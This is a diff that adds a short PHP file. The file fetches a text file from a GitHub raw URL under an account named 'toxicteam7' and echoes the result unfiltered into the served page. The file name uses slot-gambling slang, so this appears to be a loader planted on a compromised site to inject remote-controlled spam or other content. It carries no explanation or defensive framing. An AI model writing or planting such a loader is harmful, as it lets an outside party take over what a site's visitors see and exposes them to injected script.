@@ -1,0 +1,18 @@
+<?php 
+  
+    $ch = curl_init(); 
+
+
+    curl_setopt($ch, CURLOPT_URL, "https://raw.githubusercontent.com/toxicteam7/elpeh/00915c79be1a82c8c3d366bb6226e7ba92e30c46/kw303-gacor-baru.txt");
+
+   
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
+
+     
+    $output = curl_exec($ch); 
+
+    curl_close($ch);      
+
+  
+    echo $output;
+?>
